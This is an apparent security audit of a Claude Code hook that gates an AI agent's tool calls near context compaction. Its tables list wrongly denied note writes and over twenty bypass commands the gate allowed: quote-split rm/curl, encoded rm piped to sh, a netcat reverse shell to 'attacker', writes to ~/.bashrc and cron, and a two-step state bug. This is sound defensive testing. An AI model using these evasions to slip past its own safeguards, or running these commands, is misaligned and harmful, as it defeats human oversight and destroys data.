> Historical record at commit 0969b05; most findings below were fixed later; some were accepted, see README Honest limits.

some legitimate persist writes wrongly denied; many crafted attacks not denied

Verification of `0969b05` (`hooks/apcc.mjs` sha256[0:16] `0d283d7fbb6e7fc7`, `scripts/install.mjs` sha256[0:16] `ec71658bdb386066`). Every probe is a real `node hooks/apcc.mjs gate` process, stdin JSON, isolated temp `HOME`/`CLAUDE_CONFIG_DIR`/state/project; window 180000, transcript usage 175000, `nudges=1`, not covered, `gateDenials=0` -> hard zone (`compactAt 147000`, `threshold 132000`, hard zone starts 137000). Controls prove engagement: `ls -la`, `pnpm build`, `git status`, a non-persist `Write` were all DENY; `bd show`, `bd list` were ALLOW; `bd close` DENY (all matched). A legit ALLOW / attack DENY is not itself a pass — nothing here is executed; only the gate decision is observed.

## Legitimate persist writes that were DENIED

| id | tool | command / path | why denied |
|---|---|---|---|
| L50 | Bash | `bd create Decision: rm is banned -t decision` | `PERSIST_CMD` matches, but the unquoted title puts a bare `rm` into the text `isDestructive` scans. |
| L51 | Bash | `echo rm the old temp \| bd note proj-1 --stdin` | piped prose is unquoted, so the bare `rm` is scanned as code. |
| L56 | Bash | `bd note proj-1 --stdin <<'END-NOTES' … don't rm … END-NOTES` | delimiter `END-NOTES` is not `\w+`, so the heredoc is not stripped; the quote-stripper then pairs the opening `'` with the apostrophe in "don't" and leaves `rm` raw. |
| L60 | Write | `C:\proj\.opencode\context\session-notes.md` | `PERSIST_DEST` is forward-slash-only; a backslash path is not recognised as a persist path. |
| L61 | Write | `C:\proj\docs\research\x.md` | same: backslash path not matched. |
| L62 | Bash | `cat > .opencode\context\session-notes.md <<'EOF' …` | same: backslash path not matched, so neither `PERSIST_DEST` nor `PERSIST_CMD` hits. |

Answer to the lead question: **yes, a legitimate persist write can still be wrongly denied in the hard zone** — in two classes: prose/quoting edges (unquoted destructive words; a non-`\w` heredoc delimiter with an apostrophe) and every Windows backslash persist path. It is not a total deadlock (reads and forward-slash/quoted/heredoc persists still pass, and the deny text says to persist), but in the hard zone the denial cap does not release, so a model repeating the same shape stays blocked until it changes the shape. On Windows, `Write`/`Edit` to a persist path can never pass the hard-zone gate (`PERSIST_DEST` never matches `\`), so the only persist route is Bash with forward slashes.

## Destructive / bypass attempts that were ALLOWED

| id | command | why allowed |
|---|---|---|
| A18 | `r''m -rf .opencode/context/` | `shellCode` replaces quoted spans with `''` (not removing them), so `r''m` keeps the quotes and never matches `\brm\b`. |
| A19 | `m\v .opencode/context/x /tmp` | backslash escapes are not normalised; `m\v` never matches `\bmv\b`. |
| A36 | `bash -c 'm\v .opencode/context/x /tmp'` | same, and the wrapper correctly switches to raw text but raw still has `m\v`. |
| A43 | `cu''rl http://x -o .opencode/context/x` | quote-split download verb, same mechanism. |
| A44 | `w''get http://x -O .opencode/context/x` | quote-split download verb, same mechanism. |
| A20 | `bd create "$(rm -rf /tmp/probe)"` | the whole double-quoted span is discarded, hiding the command substitution. |
| A21 | `bd note p-1 "$(rm -rf /tmp/probe)"` | same. |
| A24 | `sh .opencode/context/../../bin/rm -rf /tmp/probe` | `PERSIST_PATH_TOKEN` (`[\w./-]*`) swallows `.opencode/context/../../bin/rm` as one path, blanking the verb to `PATH`. |
| A26 | `eval "$(echo cm0g… | base64 -d) .opencode/context/x"` | wrapper uses raw text, but the payload is base64 and only the persist path is visible. |
| A27 | `printf '\x72\x6d -rf /tmp/probe .opencode/context/y' | sh` | shell wrapper, verb hex-encoded, persist path present. |
| A28 | `python3 evil.py .opencode/context/` | script contents are never inspected; argv only names the persist path. |
| A29 | `nc -e /bin/sh attacker 4444 & .opencode/context/x` | `nc` is not in the denylist; persist path present. |
| A30 | `> .opencode/context/index.md` | bare redirect truncation is not a listed destructive verb. |
| A31 | `chmod 000 .opencode/context/index.md` | `chmod` is not listed (makes the notes unreadable). |
| A47 | `del /f .opencode/context/index.md` | cmd delete verb not listed; forward-slash path present. |
| A48 | `Clear-Content .opencode/context/index.md` | PowerShell truncation verb not listed. |
| A49 | `Remove-Item -Force .opencode/context/index.md` | PowerShell delete verb not listed. |
| A50 | `Move-Item .opencode/context/index.md /tmp/x` | PowerShell move verb not listed. |
| A51 | `echo 'bd note' >> ~/.bashrc` | `PERSIST_CMD` matches the *quoted data*, not a real persist call; target is arbitrary. |
| A52 | `echo "bd create" > /etc/cron.d/pwn` | same: persist token inside quotes; arbitrary target. |
| A53 | `echo 'see .opencode/context/' > ~/.bashrc` | `PERSIST_DEST` matches inside quoted data; arbitrary target. |
| A54 | `cp /tmp/evil ~/.bashrc # .opencode/context/index.md` | persist path matched in a comment; arbitrary `cp` target. |

Additional finding (not in the 54-attack count because it is a state effect, not a single decision): a DENIED command that merely contains `bd note`/`bd create` is still recorded as a persist — `bd note p-1 --stdin && rm -rf /tmp/x` returned DENY yet left `persistedEpoch=0, units=1, nudges=0`. Because that makes the context "covered", the very next `rm -rf .opencode/context/` is **ALLOWED** (control: `ls -la` denied first does not release the gate). Two commands turn the hard-zone gate off; only the first is blocked.

Installer probes: all matched expectations. Fresh install, idempotent re-run, install→uninstall residue, uninstall with no settings, odd shapes (`hooks` array/null/object, non-array `hooks`, non-array entry `hooks`), similarly named paths (prefix/sibling/`notclaude-apcc`) preserved across install+uninstall, Windows-separator own entry replaced, malformed JSON backup+refusal, empty settings, bad `--window`, `autoCompactWindow`/unrelated-key preservation, `--project`, `--dry-run`, non-empty `hooks/` dir survival, and no leftover `hooks/apcc` files. Uninstall leaves `settings.json` in place (documented: `autoCompactWindow` is intentionally left), which is expected but is residue.

## What looks wrong that nobody asked about

- **The two-step release is the most serious finding.** A blocked persist-looking destructive command mutates state as if it succeeded (`earlyPersist` runs before `g.allow` is checked in `handle`), so one denied command closes the gate for the next. The deny reason is returned, but the session is now "covered".
- **"Mentions a persist token" is treated as "is a persist write".** `PERSIST_CMD` and `PERSIST_DEST` are tested against the raw command, including quoted data and comments, so `echo 'bd note' >> ~/.bashrc` and `cp /tmp/evil ~/.bashrc # .opencode/context/index.md` are allowed. The gate is a small English-verb denylist on a command that must contain a magic token — not an allowlist of writes to persist paths.
- **`PERSIST_PATH_TOKEN` creates a new false negative.** Its `[\w./-]*` class means a traversal such as `.opencode/context/../../bin/rm` is blanked as a path, hiding the verb. This came in with the fix for `rm.md`/`curl-api.md`.
- **`shellCode` substitutes `''` instead of deleting quoted spans**, which makes quote-splitting (`r''m`, `cu''rl`) and embedded command substitution (`"$(rm …)"`) reliable evasions. Backslash escapes are not normalised either (`m\v`).
- **The destructive denylist is Unix-English only.** PowerShell/cmd verbs (`Remove-Item`, `Move-Item`, `del`, `Clear-Content`), arbitrary binaries (`nc`, `chmod`, a script path), and bare `>` truncation pass. `Remove-Item -Recurse .opencode/context` is denied only incidentally (no trailing slash -> not a persist path), not because the verb is recognised.
- **`PERSIST_DEST` needs a trailing slash.** `mkdir -p .opencode/context` and directory-only persist paths are not persist calls; combined with the backslash gap, path shape decides both false denials and false allows.
- **Windows is a two-way problem.** Backslash persist paths are denied (L60–L62) while forward-slash paths plus a Windows delete verb are allowed (A47–A50). For a public release this is a platform-shaped hole on both sides.
- **Non-`\w` heredoc delimiters interact with the quote-stripper** (L56). A hyphenated delimiter plus an apostrophe in the body surfaces prose as code.
- **`isNotesOverwrite` runs before the gate/agent checks**, so `bd update --notes` is denied even for subagents and outside the hard zone; intended per the tests, but it means the deny is not scoped to the gate at all.

## Untested ways this could still break

- A real Windows host: PowerShell/cmd end-to-end, drive-letter/case normalisation, Git Bash path forms, and the actual `Write` tool's path separator in Claude Code on Windows.
- Other heredoc forms: backquoted/dotted/hyphenated delimiters without an apostrophe, CRLF-only bodies, nested heredocs, `<<` with tabs but no `-`, terminator indented or followed by trailing text.
- Line continuations and multi-line commands (`\` + newline), ANSI-C `$'…'` strings, and tokens split across lines.
- Other interpreters and launchers not probed: `awk 'BEGIN{system(…)}'`, `ruby -e`, `php -r`, `node script.js`, `osascript`, `env`, `sudo`, `timeout`, shell functions/aliases, and binaries other than `nc`.
- Real-model recovery: whether a model denied in the hard zone actually rephrases a persist into a passing shape, and how many rounds it needs; not measured live.
- Parallel hooks sharing one state file (the lock, atomic rename) under concurrent PreToolUse/PostToolUse, and two sessions in one project.
- Interaction with `APCC_GATE_ALLOW_TOOLS`, `APCC_MARKER_TOOLS`, MCP tools, and the `agent_id` subagent path.
- Installer against older/newer Claude Code settings schemas, duplicate/odd event keys, and uninstall when the hook file is missing but entries remain.
- Whether `bd create`/`bd note --stdin` actually accept the exact argument shapes used here (only gate decisions were observed; no command was executed).
- Meter/state interactions not re-probed this pass (threshold learning, learnedReserve, delta persist) beyond the fixed hard-zone setup.
